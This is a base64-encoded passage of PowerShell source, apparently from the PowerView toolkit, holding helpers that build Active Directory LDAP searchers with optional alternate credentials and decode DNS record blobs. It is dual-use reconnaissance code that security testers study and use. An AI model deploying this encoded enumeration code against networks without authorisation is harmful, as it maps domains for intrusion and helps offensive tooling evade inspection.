AgICAgICBbSW50MzJdJExvdyAgPSAkVGVtcC5HZXRUeXBlKCkuSW52b2tlTWVtYmVyKCdMb3dQYXJ0JywgIFtTeXN0ZW0uUmVmbGVjdGlvbi5CaW5kaW5nRmxhZ3NdOjpHZXRQcm9wZXJ0eSwgJE51bGwsICRUZW1wLCAkTnVsbCkKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0UHJvcGVydGllc1skX10gPSBbSW50NjRdKCIweHswOng4fXsxOng4fSIgLWYgJEhpZ2gsICRMb3cpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0NvbnZlcnQtTERBUFByb3BlcnR5XSBlcnJvcjogJF8iCiAgICAgICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BbJF9dCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkUHJvcGVydGllc1skX10uY291bnQgLWVxIDEpIHsKICAgICAgICAgICAgICAgICRPYmplY3RQcm9wZXJ0aWVzWyRfXSA9ICRQcm9wZXJ0aWVzWyRfXVswXQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJE9iamVjdFByb3BlcnRpZXNbJF9dID0gJFByb3BlcnRpZXNbJF9dCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CiAgICB0cnkgewogICAgICAgIE5ldy1PYmplY3QgLVR5cGVOYW1lIFBTT2JqZWN0IC1Qcm9wZXJ0eSAkT2JqZWN0UHJvcGVydGllcwogICAgfQogICAgY2F0Y2ggewogICAgICAgIFdyaXRlLVdhcm5pbmcgIltDb252ZXJ0LUxEQVBQcm9wZXJ0eV0gRXJyb3IgcGFyc2luZyBMREFQIHByb3BlcnRpZXMgOiAkXyIKICAgIH0KfQoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMKIyBEb21haW4gaW5mbyBmdW5jdGlvbnMgYmVsb3cuCiMKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCmZ1bmN0aW9uIEdldC1Eb21haW5TZWFyY2hlciB7CjwjCi5TWU5PUFNJUwoKSGVscGVyIHVzZWQgYnkgdmFyaW91cyBmdW5jdGlvbnMgdGhhdCBidWlsZHMgYSBjdXN0b20gQUQgc2VhcmNoZXIgb2JqZWN0LgoKQXV0aG9yOiBXaWxsIFNjaHJvZWRlciAoQGhhcm1qMHkpICAKTGljZW5zZTogQlNEIDMtQ2xhdXNlICAKUmVxdWlyZWQgRGVwZW5kZW5jaWVzOiBHZXQtRG9tYWluICAKCi5ERVNDUklQVElPTgoKVGFrZXMgYSBnaXZlbiBkb21haW4gYW5kIGEgbnVtYmVyIG9mIGN1c3RvbWl6YXRpb25zIGFuZCByZXR1cm5zIGEKU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyIG9iamVjdC4gVGhpcyBmdW5jdGlvbiBpcyB1c2VkCmhlYXZpbHkgYnkgb3RoZXIgTERBUC9BRFNJIHNlYXJjaGVyIGZ1bmN0aW9ucyAoVmVyYi1Eb21haW4qKS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byB1c2UgZm9yIHRoZSBxdWVyeSwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBMREFQRmlsdGVyCgpTcGVjaWZpZXMgYW4gTERBUCBxdWVyeSBzdHJpbmcgdGhhdCBpcyB1c2VkIHRvIGZpbHRlciBBY3RpdmUgRGlyZWN0b3J5IG9iamVjdHMuCgouUEFSQU1FVEVSIFByb3BlcnRpZXMKClNwZWNpZmllcyB0aGUgcHJvcGVydGllcyBvZiB0aGUgb3V0cHV0IG9iamVjdCB0byByZXRyaWV2ZSBmcm9tIHRoZSBzZXJ2ZXIuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2UKClRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCwgZS5nLiAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgpVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIFNlYXJjaEJhc2VQcmVmaXgKClNwZWNpZmllcyBhIHByZWZpeCBmb3IgdGhlIExEQVAgc2VhcmNoIHN0cmluZyAoaS5lLiAiQ049U2l0ZXMsQ049Q29uZmlndXJhdGlvbiIpLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8gZm9yIHRoZSBzZWFyY2guCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgU2VjdXJpdHlNYXNrcwoKU3BlY2lmaWVzIGFuIG9wdGlvbiBmb3IgZXhhbWluaW5nIHNlY3VyaXR5IGluZm9ybWF0aW9uIG9mIGEgZGlyZWN0b3J5IG9iamVjdC4KT25lIG9mICdEYWNsJywgJ0dyb3VwJywgJ05vbmUnLCAnT3duZXInLCAnU2FjbCcuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgZG9tYWluLgoKLkVYQU1QTEUKCkdldC1Eb21haW5TZWFyY2hlciAtRG9tYWluIHRlc3RsYWIubG9jYWwKClJldHVybiBhIHNlYXJjaGVyIGZvciBhbGwgb2JqZWN0cyBpbiB0ZXN0bGFiLmxvY2FsLgoKLkVYQU1QTEUKCkdldC1Eb21haW5TZWFyY2hlciAtRG9tYWluIHRlc3RsYWIubG9jYWwgLUxEQVBGaWx0ZXIgJyhzYW1BY2NvdW50VHlwZT04MDUzMDYzNjgpJyAtUHJvcGVydGllcyAnU2FtQWNjb3VudE5hbWUsbGFzdGxvZ29uJwoKUmV0dXJuIGEgc2VhcmNoZXIgZm9yIHVzZXIgb2JqZWN0cyBpbiB0ZXN0bGFiLmxvY2FsIGFuZCBvbmx5IHJldHVybiB0aGUgU2FtQWNjb3VudE5hbWUgYW5kIExhc3RMb2dvbiBwcm9wZXJ0aWVzLgoKLkVYQU1QTEUKCkdldC1Eb21haW5TZWFyY2hlciAtU2VhcmNoQmFzZSAiTERBUDovL09VPXNlY3JldCxEQz10ZXN0bGFiLERDPWxvY2FsIgoKUmV0dXJuIGEgc2VhcmNoZXIgdGhhdCBzZWFyY2hlcyB0aHJvdWdoIHRoZSBzcGVjaWZpYyBBRFMvTERBUCBzZWFyY2ggYmFzZSAoaS5lLiBPVSkuCgouT1VUUFVUUwoKU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRmlsdGVyJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkTERBUEZpbHRlciwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFByb3BlcnRpZXMsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0FsaWFzKCdBRFNQYXRoJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlUHJlZml4LAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0ID0gMTIwLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0RhY2wnLCAnR3JvdXAnLCAnTm9uZScsICdPd25lcicsICdTYWNsJyldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkU2VjdXJpdHlNYXNrcywKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVG9tYnN0b25lLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBQUk9DRVNTIHsKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEb21haW4nXSkgewogICAgICAgICAgICAkVGFyZ2V0RG9tYWluID0gJERvbWFpbgoKICAgICAgICAgICAgaWYgKCRFTlY6VVNFUkROU0RPTUFJTiAtYW5kICgkRU5WOlVTRVJETlNET01BSU4uVHJpbSgpIC1uZSAnJykpIHsKICAgICAgICAgICAgICAgICMgc2VlIGlmIHdlIGNhbiBncmFiIHRoZSB1c2VyIEROUyBsb2dvbiBkb21haW4gZnJvbSBlbnZpcm9ubWVudCB2YXJpYWJsZXMKICAgICAgICAgICAgICAgICRVc2VyRG9tYWluID0gJEVOVjpVU0VSRE5TRE9NQUlOCiAgICAgICAgICAgICAgICBpZiAoJEVOVjpMT0dPTlNFUlZFUiAtYW5kICgkRU5WOkxPR09OU0VSVkVSLlRyaW0oKSAtbmUgJycpIC1hbmQgJFVzZXJEb21haW4pIHsKICAgICAgICAgICAgICAgICAgICAkQmluZFNlcnZlciA9ICIkKCRFTlY6TE9HT05TRVJWRVIgLXJlcGxhY2UgJ1xcJywnJykuJFVzZXJEb21haW4iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAjIGlmIG5vdCAtRG9tYWluIGlzIHNwZWNpZmllZCwgYnV0IC1DcmVkZW50aWFsIGlzLCB0cnkgdG8gcmV0cmlldmUgdGhlIGN1cnJlbnQgZG9tYWluIG5hbWUgd2l0aCBHZXQtRG9tYWluCiAgICAgICAgICAgICREb21haW5PYmplY3QgPSBHZXQtRG9tYWluIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgICAgICRCaW5kU2VydmVyID0gKCREb21haW5PYmplY3QuUGRjUm9sZU93bmVyKS5OYW1lCiAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluT2JqZWN0Lk5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkRU5WOlVTRVJETlNET01BSU4gLWFuZCAoJEVOVjpVU0VSRE5TRE9NQUlOLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICMgc2VlIGlmIHdlIGNhbiBncmFiIHRoZSB1c2VyIEROUyBsb2dvbiBkb21haW4gZnJvbSBlbnZpcm9ubWVudCB2YXJpYWJsZXMKICAgICAgICAgICAgJFRhcmdldERvbWFpbiA9ICRFTlY6VVNFUkROU0RPTUFJTgogICAgICAgICAgICBpZiAoJEVOVjpMT0dPTlNFUlZFUiAtYW5kICgkRU5WOkxPR09OU0VSVkVSLlRyaW0oKSAtbmUgJycpIC1hbmQgJFRhcmdldERvbWFpbikgewogICAgICAgICAgICAgICAgJEJpbmRTZXJ2ZXIgPSAiJCgkRU5WOkxPR09OU0VSVkVSIC1yZXBsYWNlICdcXCcsJycpLiRUYXJnZXREb21haW4iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICMgb3RoZXJ3aXNlLCByZXNvcnQgdG8gR2V0LURvbWFpbiB0byByZXRyaWV2ZSB0aGUgY3VycmVudCBkb21haW4gb2JqZWN0CiAgICAgICAgICAgIHdyaXRlLXZlcmJvc2UgImdldC1kb21haW4iCiAgICAgICAgICAgICREb21haW5PYmplY3QgPSBHZXQtRG9tYWluCiAgICAgICAgICAgICRCaW5kU2VydmVyID0gKCREb21haW5PYmplY3QuUGRjUm9sZU93bmVyKS5OYW1lCiAgICAgICAgICAgICRUYXJnZXREb21haW4gPSAkRG9tYWluT2JqZWN0Lk5hbWUKICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7CiAgICAgICAgICAgICMgaWYgdGhlcmUncyBub3QgYSBzcGVjaWZpZWQgc2VydmVyIHRvIGJpbmQgdG8sIHRyeSB0byBwdWxsIGEgbG9nb24gc2VydmVyIGZyb20gRU5WIHZhcmlhYmxlcwogICAgICAgICAgICAkQmluZFNlcnZlciA9ICRTZXJ2ZXIKICAgICAgICB9CgogICAgICAgICRTZWFyY2hTdHJpbmcgPSAnTERBUDovLycKCiAgICAgICAgaWYgKCRCaW5kU2VydmVyIC1hbmQgKCRCaW5kU2VydmVyLlRyaW0oKSAtbmUgJycpKSB7CiAgICAgICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJEJpbmRTZXJ2ZXIKICAgICAgICAgICAgaWYgKCRUYXJnZXREb21haW4pIHsKICAgICAgICAgICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJy8nCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaEJhc2VQcmVmaXgnXSkgewogICAgICAgICAgICAkU2VhcmNoU3RyaW5nICs9ICRTZWFyY2hCYXNlUHJlZml4ICsgJywnCiAgICAgICAgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZWFyY2hCYXNlJ10pIHsKICAgICAgICAgICAgaWYgKCRTZWFyY2hCYXNlIC1NYXRjaCAnXkdDOi8vJykgewogICAgICAgICAgICAgICAgIyBpZiB3ZSdyZSBzZWFyY2hpbmcgdGhlIGdsb2JhbCBjYXRhbG9nLCBnZXQgdGhlIHBhdGggaW4gdGhlIHJpZ2h0IGZvcm1hdAogICAgICAgICAgICAgICAgJEROID0gJFNlYXJjaEJhc2UuVG9VcHBlcigpLlRyaW0oJy8nKQogICAgICAgICAgICAgICAgJFNlYXJjaFN0cmluZyA9ICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaEJhc2UgLW1hdGNoICdeTERBUDovLycpIHsKICAgICAgICAgICAgICAgICAgICBpZiAoJFNlYXJjaEJhc2UgLW1hdGNoICJMREFQOi8vLisvLisiKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTZWFyY2hTdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgICAgICAgICAkRE4gPSAkU2VhcmNoQmFzZQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgJEROID0gJFNlYXJjaEJhc2UuU3ViU3RyaW5nKDcpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJEROID0gJFNlYXJjaEJhc2UKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgIyB0cmFuc2Zvcm0gdGhlIHRhcmdldCBkb21haW4gbmFtZSBpbnRvIGEgZGlzdGluZ3Vpc2hlZE5hbWUgaWYgYW4gQURTIHNlYXJjaCBiYXNlIGlzIG5vdCBzcGVjaWZpZWQKICAgICAgICAgICAgaWYgKCRUYXJnZXREb21haW4gLWFuZCAoJFRhcmdldERvbWFpbi5UcmltKCkgLW5lICcnKSkgewogICAgICAgICAgICAgICAgJEROID0gIkRDPSQoJFRhcmdldERvbWFpbi5SZXBsYWNlKCcuJywgJyxEQz0nKSkiCiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICRTZWFyY2hTdHJpbmcgKz0gJEROCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5TZWFyY2hlcl0gc2VhcmNoIGJhc2U6ICRTZWFyY2hTdHJpbmciCgogICAgICAgIGlmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpblNlYXJjaGVyXSBVc2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMgZm9yIExEQVAgY29ubmVjdGlvbiIKICAgICAgICAgICAgIyBiaW5kIHRvIHRoZSBpbml0YWwgc2VhcmNoIG9iamVjdCB1c2luZyBhbHRlcm5hdGUgY3JlZGVudGlhbHMKICAgICAgICAgICAgJERvbWFpbk9iamVjdCA9IE5ldy1PYmplY3QgRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkoJFNlYXJjaFN0cmluZywgJENyZWRlbnRpYWwuVXNlck5hbWUsICRDcmVkZW50aWFsLkdldE5ldHdvcmtDcmVkZW50aWFsKCkuUGFzc3dvcmQpCiAgICAgICAgICAgICRTZWFyY2hlciA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkRpcmVjdG9yeVNlYXJjaGVyKCREb21haW5PYmplY3QpCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICAjIGJpbmQgdG8gdGhlIGluaXRhbCBvYmplY3QgdXNpbmcgdGhlIGN1cnJlbnQgY3JlZGVudGlhbHMKICAgICAgICAgICAgJFNlYXJjaGVyID0gTmV3LU9iamVjdCBTeXN0ZW0uRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5U2VhcmNoZXIoW0FEU0ldJFNlYXJjaFN0cmluZykKICAgICAgICB9CgogICAgICAgICRTZWFyY2hlci5QYWdlU2l6ZSA9ICRSZXN1bHRQYWdlU2l6ZQogICAgICAgICRTZWFyY2hlci5TZWFyY2hTY29wZSA9ICRTZWFyY2hTY29wZQogICAgICAgICRTZWFyY2hlci5DYWNoZVJlc3VsdHMgPSAkRmFsc2UKICAgICAgICAkU2VhcmNoZXIuUmVmZXJyYWxDaGFzaW5nID0gW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5SZWZlcnJhbENoYXNpbmdPcHRpb25dOjpBbGwKCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsKICAgICAgICAgICAgJFNlYXJjaGVyLlNlcnZlclRpbWVMaW1pdCA9ICRTZXJ2ZXJUaW1lTGltaXQKICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7CiAgICAgICAgICAgICRTZWFyY2hlci5Ub21ic3RvbmUgPSAkVHJ1ZQogICAgICAgIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snTERBUEZpbHRlciddKSB7CiAgICAgICAgICAgICRTZWFyY2hlci5maWx0ZXIgPSAkTERBUEZpbHRlcgogICAgICAgIH0KCiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VjdXJpdHlNYXNrcyddKSB7CiAgICAgICAgICAgICRTZWFyY2hlci5TZWN1cml0eU1hc2tzID0gU3dpdGNoICgkU2VjdXJpdHlNYXNrcykgewogICAgICAgICAgICAgICAgJ0RhY2wnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6RGFjbCB9CiAgICAgICAgICAgICAgICAnR3JvdXAnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6R3JvdXAgfQogICAgICAgICAgICAgICAgJ05vbmUnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6Tm9uZSB9CiAgICAgICAgICAgICAgICAnT3duZXInIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6T3duZXIgfQogICAgICAgICAgICAgICAgJ1NhY2wnIHsgW1N5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5TZWN1cml0eU1hc2tzXTo6U2FjbCB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Byb3BlcnRpZXMnXSkgewogICAgICAgICAgICAjIGhhbmRsZSBhbiBhcnJheSBvZiBwcm9wZXJ0aWVzIHRvIGxvYWQgdy8gdGhlIHBvc3NpYmlsaXR5IG9mIGNvbW1hLXNlcGFyYXRlZCBzdHJpbmdzCiAgICAgICAgICAgICRQcm9wZXJ0aWVzVG9Mb2FkID0gJFByb3BlcnRpZXN8IEZvckVhY2gtT2JqZWN0IHsgJF8uU3BsaXQoJywnKSB9CiAgICAgICAgICAgICROdWxsID0gJFNlYXJjaGVyLlByb3BlcnRpZXNUb0xvYWQuQWRkUmFuZ2UoKCRQcm9wZXJ0aWVzVG9Mb2FkKSkKICAgICAgICB9CgogICAgICAgICRTZWFyY2hlcgogICAgfQp9CgoKZnVuY3Rpb24gQ29udmVydC1ETlNSZWNvcmQgewo8IwouU1lOT1BTSVMKCkhlbHBlcnMgdGhhdCBkZWNvZGVzIGEgYmluYXJ5IEROUyByZWNvcmQgYmxvYi4KCkF1dGhvcjogTWljaGFlbCBCLiBTbWl0aCwgV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZSAgCgouREVTQ1JJUFRJT04KCkRlY29kZXMgYSBiaW5hcnkgYmxvYiByZXByZXNlbnRpbmcgYW4gQWN0aXZlIERpcmVjdG9yeSBETlMgZW50cnkuClVzZWQgYnkgR2V0LURvbWFpbkROU1JlY29yZC4KCkFkYXB0ZWQvcG9ydGVkIGZyb20gTWljaGFlbCBCLiBTbWl0aCdzIGNvZGUgYXQgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21tZXNzYW5vL1Bvd2VyU2hlbGwvbWFzdGVyL2Rucy1kdW1wLnBzMQoKLlBBUkFNRVRFUiBETlNSZWNvcmQKCkEgYnl0ZSBhcnJheSByZXByZXNlbnRpbmcgdGhlIEROUyByZWNvcmQuCgouT1VUUFVUUwoKU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0N1c3RvbU9iamVjdAoKT3V0cHV0cyBjdXN0b20gUFNPYmplY3RzIHdpdGggZGV0YWlsZWQgaW5mb3JtYXRpb24gYWJvdXQgdGhlIEROUyByZWNvcmQgZW50cnkuCgouTElOSwoKaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21tZXNzYW5vL1Bvd2VyU2hlbGwvbWFzdGVyL2Rucy1kdW1wLnBzMQojPgoKICAgIFtPdXRwdXRUeXBlKCdTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3VzdG9tT2JqZWN0JyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIE1hbmRhdG9yeSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtCeXRlW11dCiAgICAgICAgJEROU1JlY29yZAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICBmdW5jdGlvbiBHZXQtTmFtZSB7CiAgICAgICAgICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZU91dHB1dFR5cGVDb3JyZWN0bHknLCAnJyldCiAgICAgICAgICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICAgICAgICAgIFBhcmFtKAogICAgICAgICAgICAgICAgW0J5dGVbXV0KICAgICAgICAgICAgICAgICRSYXcKICAgICAgICAgICAgKQoKICAgICAgICAgICAgW0ludF0kTGVuZ3RoID0gJFJhd1swXQogICAgICAgICAgICBbSW50XSRTZWdtZW50cyA9ICRSYXdbMV0KICAgICAgICAgICAgW0ludF0kSW5kZXggPSAgMgogICAgICAgICAgICBbU3RyaW5nXSROYW1lICA9ICcnCgogICAgICAgICAgICB3aGlsZSAoJFNlZ21lbnRzLS0gLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFtJbnRdJFNlZ21lbnRMZW5ndGggPSAkUmF3WyRJbmRleCsrXQogICAgICAgICAgICAgICAgd2hpbGUgKCRTZWdtZW50TGVuZ3RoLS0gLWd0IDApIHsKICAgICAgICAgICAgICAgICAgICAkTmFtZSArPSBbQ2hhcl0kUmF3WyRJbmRleCsrXQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJE5hbWUgKz0gIi4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJE5hbWUKICAgICAgICB9CiAgICB9CgogICAgUFJPQ0VTUyB7CiAgICAgICAgIyAkUkRhdGFMZW4gPSBbQml0Q29udmVydGVyXTo6VG9VSW50MTYoJEROU1JlY29yZCwgMCkKICAgICAgICAkUkRhdGFUeXBlID0gW0JpdENvbnZlcnRlcl06OlRvVUludDE2KCRETlNSZWNvcmQsIDIpCiAgICAgICAgJFVwZGF0ZWRBdFNlcmlhbCA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQzMigkRE5TUmVjb3JkLCA4KQoKICAgICAgICAkVFRMUmF3ID0gJEROU1JlY29yZFsxMi4uMTVdCgogICAgICAgICMgcmV2ZXJzZSBmb3IgYmlnIGVuZGlhbgogICAgICAgICROdWxsID0gW2FycmF5XTo6UmV2ZXJzZSgkVFRMUmF3KQogICAgICAgICRUVEwgPSBbQml0Q29udmVydGVyXTo6VG9VSW50MzIoJFRUTFJhdywgMCkKCiAgICAgICAgJEFnZSA9IFtCaXRDb252ZXJ0ZXJdOjpUb1VJbnQzMigkRE5TUmVjb3JkLCAyMCkKICAgICAgICBpZiAoJEFnZSAtbmUgMCkgewogICAgICAgICAgICAkVGltZVN0YW1wID0gKChHZXQtRGF0ZS